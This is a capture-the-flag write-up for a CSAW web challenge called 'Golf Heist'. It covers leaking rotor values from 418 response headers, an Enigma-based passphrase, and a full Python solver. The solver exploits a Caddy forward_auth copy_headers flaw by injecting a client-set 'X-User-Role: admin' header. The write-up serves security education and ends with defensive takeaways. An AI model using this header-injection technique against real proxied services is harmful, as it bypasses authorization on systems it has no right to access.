# Golf Heist

| Event | Category | Flag format | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Web | `csaw{...}` | `csaw{REDACTED}` |

> *"The caddy carries everything for them — keys, secrets, headers… and he doesn't check what's in the bag."*

**TL;DR** — Three steps. Leak three Enigma rotor settings from `418 I'm a teapot` response
headers, run them through a three-rotor Enigma on the fixed input `GOL` to derive a passphrase,
then exploit **GHSA-7r4p-vjf4-gxv4** — Caddy's `forward_auth` + `copy_headers` does not strip
client-supplied headers — to inject `X-User-Role: admin` and claim the flag. The challenge
description names the bug class outright.

> **Flag redaction.** Published originally with the flag redacted and no local copy survives, so
> `csaw{REDACTED}` is kept rather than invented.

**Target:** `https://golf-heist.ctf.csaw.io/`

---

## 1. Leak the rotor settings

Three inventory endpoints answer `418 I'm a teapot` and leak a base64-encoded, zero-padded
integer in an `X-Golf-Hint` header:

| Endpoint | Rotor |
|---|---|
| `/pro-shop/inventory/clubs` | R1 |
| `/pro-shop/inventory/balls` | R2 |
| `/pro-shop/inventory/bags` | R3 |

```
X-Golf-Hint: MDAwMDE4  ->  "000018"  ->  R1 = 18
```

A `418` is easy to dismiss as a joke status — here it is the signal that the endpoint exists and
is carrying data. **The rotors regenerate on every service restart**, so a hardcoded solver
breaks; read them live.

---

## 2. Derive the passphrase

The leaked rotors drive a three-rotor Enigma (rotors I/II/III plus reflector) over the fixed
input letters `G`, `O`, `L`.

```python
ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {
    "I":   "EKMFLGDQVZNTOWYHXUSPAIBRCJ",
    "II":  "AJDKSIRUXBLHWTMCQGZNPYFVOE",
    "III": "BDFHJLCPRTXVZNYEIWGAKMUSQO",
    "REF": "YRUHQSLDPXNGOKMIEBFZCWVJAT",
}

def enigma(r1, r2, r3):
    def f(c, w, o):
        return w[(ALPHA.index(c) + o) % 26]
    out = []
    for s in ["G", "O", "L"]:
        c = s
        c = f(c, W["I"],   r1 % 26)
        c = f(c, W["II"],  r2 % 26)
        c = f(c, W["III"], r3 % 26)
        c = W["REF"][ALPHA.index(c)]
        c = f(c, W["III"], (26 - r3 % 26) % 26)
        out.append(c)
    return out
```

With the example rotors `R1=18, R2=14, R3=15` this yields the letters `W`, `O`, `H`.

Each letter then indexes a word table — at positions **0, 1, 0**, not 0, 0, 0:

```python
WORDS = {
    "A": ["albatross", "approach", "ace"],
    "B": ["birdie", "bogey", "bunker"],
    # ...
    "W": ["wedge", "water", "waggle"],
    "O": ["open", "out", "oath"],
    "H": ["handicap", "hazard", "hole"],
}

PHRASE = [WORDS["W"][0], WORDS["O"][1], WORDS["H"][0]]   # -> wedge out handicap
```

Passphrase: `wedge out handicap`.

---

## 3. The real vulnerability — Caddy `forward_auth` header injection

`/api/vault/admin-item` validates the phrase and then reads the user's role straight out of the
request:

```python
role = req.headers.get("X-User-Role", "")
if role.lower() == "admin":
    return {... "flag": FLAG ...}
```

Trusting a request header is only safe if something upstream guarantees the client cannot set
it. The leaked Caddyfile shows why nothing does:

```caddyfile
:8000 {
    forward_auth 127.0.0.1:9091 {
        uri /auth
        copy_headers X-User-Id X-User-Role
    }
    reverse_proxy 127.0.0.1:9092
}
```

`copy_headers` copies `X-User-Id` and `X-User-Role` **from the auth response** to the upstream
request — but it does **not strip the client's own copies first**. A header the client sets
survives all the way to the backend, where it is treated as the proxy's verdict.

This is **GHSA-7r4p-vjf4-gxv4**.

```http
POST /api/vault/admin-item HTTP/1.1
Host: golf-heist.ctf.csaw.io
X-User-Role: admin
X-User-Id: caddy
Content-Type: application/json

{"phrase": "wedge out handicap"}
```

```json
{
  "success": true,
  "tier": "admin",
  "message": "Welcome, caddy. Identity header trusted. The caddy looked the other way.",
  "special_item": {
    "locked": false,
    "name": "The Golden Putter",
    "description": "Forged from a single billet of 18k gold. No grip. No mercy. One of one.",
    "provenance": "Taken from the Avispa vault, March 2025. The caddy never saw it leave."
  },
  "flag": "csaw{REDACTED}",
  "cve": "GHSA-7r4p-vjf4-gxv4",
  "exploit": "Caddy forward_auth copy_headers does not strip client-supplied headers. X-User-Role: admin was injected and trusted by the backend."
}
```

---

## 4. Solver

```python
#!/usr/bin/env python3
# solve.py — Golf Heist: teapot header leak -> Enigma -> Caddy header injection.
#
# usage: python solve.py https://golf-heist.ctf.csaw.io
import base64
import json
import sys
import requests

B = sys.argv[1] if len(sys.argv) > 1 else "https://golf-heist.ctf.csaw.io"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"

ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {
    "I":   "EKMFLGDQVZNTOWYHXUSPAIBRCJ",
    "II":  "AJDKSIRUXBLHWTMCQGZNPYFVOE",
    "III": "BDFHJLCPRTXVZNYEIWGAKMUSQO",
    "REF": "YRUHQSLDPXNGOKMIEBFZCWVJAT",
}


def enigma(r1, r2, r3):
    def f(c, w, o):
        return w[(ALPHA.index(c) + o) % 26]
    out = []
    for sym in ["G", "O", "L"]:
        c = sym
        c = f(c, W["I"], r1 % 26)
        c = f(c, W["II"], r2 % 26)
        c = f(c, W["III"], r3 % 26)
        c = W["REF"][ALPHA.index(c)]
        c = f(c, W["III"], (26 - r3 % 26) % 26)
        out.append(c)
    return out


def main():
    # 1) leak rotor settings from the teapot endpoints (they rotate on restart)
    rot = {}
    for path, key in (("clubs", "r1"), ("balls", "r2"), ("bags", "r3")):
        r = s.get(f"{B}/pro-shop/inventory/{path}", timeout=20)
        h = r.headers.get("X-Golf-Hint", "")
        rot[key] = int(base64.b64decode(h).decode())
        print(f"[*] {path:6} {r.status_code} hint={h} -> {key}={rot[key]}")

    # 2) derive the passphrase (word indices are 0, 1, 0)
    letters = enigma(rot["r1"], rot["r2"], rot["r3"])
    words = s.get(f"{B}/api/word-table", timeout=20).json()["table"]
    phrase = " ".join([words[letters[0]][0], words[letters[1]][1], words[letters[2]][0]])
    print(f"[*] rotor letters : {letters}")
    print(f"[+] phrase        : {phrase!r}")

    # 3) header injection through the caddy (GHSA-7r4p-vjf4-gxv4)
    r = s.post(
        f"{B}/api/vault/admin-item",
        json={"phrase": phrase},
        headers={"X-User-Role": "admin", "X-User-Id": "caddy"},
        timeout=20,
    )
    print(f"[*] admin-item    : {r.status_code}")
    print(json.dumps(r.json(), indent=2)[:1200])


if __name__ == "__main__":
    main()
```

---

## Flag

```
csaw{REDACTED}
```

---

## Takeaways

- **A reverse proxy that adds trusted headers must delete the client's version of them first.**
  "The proxy sets this header" is not the same as "only the proxy can set this header" — and
  `copy_headers` in particular reads as if it does both.
- **Read the challenge description as a bug-class hint.** "He doesn't check what's in the bag" is
  a direct description of header pass-through.
- **Odd status codes mark live endpoints.** The `418`s were the discovery mechanism, not a joke.
- **Rotating secrets force honest solvers.** Rotors regenerate on restart, so the solution had to
  read them live rather than bake in one observed run.

## Files

- `solve.py` — full live solver.
- `app/main.py` — challenge source (released player files).
- `Dockerfile`, `requirements.txt` — for local testing.

## References

- [GHSA-7r4p-vjf4-gxv4](https://github.com/caddyserver/caddy/security/advisories/GHSA-7r4p-vjf4-gxv4) — Caddy `forward_auth` header advisory.
